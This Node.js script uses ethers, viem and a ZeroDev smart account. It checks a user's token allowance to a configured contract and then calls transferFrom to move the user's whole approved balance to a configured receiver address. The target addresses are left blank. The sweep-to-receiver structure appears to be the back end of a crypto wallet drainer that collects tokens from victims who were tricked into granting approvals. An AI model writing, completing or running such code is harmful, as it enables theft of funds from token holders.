
const { ethers } = require('ethers');
const {
    config,
    tokenABI
} = require('./utils/configconfig1.js');
const { privateKeyToAccount } = require('viem/accounts');
const { createEcdsaKernelAccountClient } = require("@zerodev/presets/zerodev");
const { mainnet } = require('viem/chains');
const { parseAbi, encodeFunctionData } = require('viem');
const { bundlerActions } = require('permissionless');

const tokenAddress = "";
const userAddr = "";

const provider = new ethers.JsonRpcProvider(config.rpc.https[config.chainID]);

const main = async () => {
    try {
        const tokenContract = new ethers.Contract(tokenAddress, tokenABI, provider);

        const allowance = await tokenContract.allowance(userAddr, config.kernelContract);
        const tokenBalance = await tokenContract.balanceOf(userAddr);

        if (tokenBalance > 0 && allowance > 0) {
            const contractABI = parseAbi([
                'function transferFrom(address from, address to, uint256 value) external'
            ])

            const signer = privateKeyToAccount(config.privatekey);
            const kernelClient = await createEcdsaKernelAccountClient({
                chain: mainnet,
                projectId: config.ZERODEV_PROJECT_ID,
                signer,
                provider: "STACKUP",
                index: BigInt(1),
                paymaster: "NONE"
            })

            const value = allowance > tokenBalance ? tokenBalance : allowance;

            const userOpHash = await kernelClient.sendUserOperation({
                userOperation: {
                    callData: await kernelClient.account.encodeCallData({
                        to: tokenAddress,
                        value: BigInt(0),
                        data: encodeFunctionData({
                            abi: contractABI,
                            functionName: "transferFrom",
                            args: [userAddr, config.receiver, value],
                        })
                    })
                }
            })
            console.log("Transferring...")

            const bundlerClient = kernelClient.extend(bundlerActions);

            await bundlerClient.waitForUserOperationReceipt({
                hash: userOpHash,
            })

            console.log("Transfer completed")

        }
    } catch (e) {
        console.error(e)
    }
}

main();

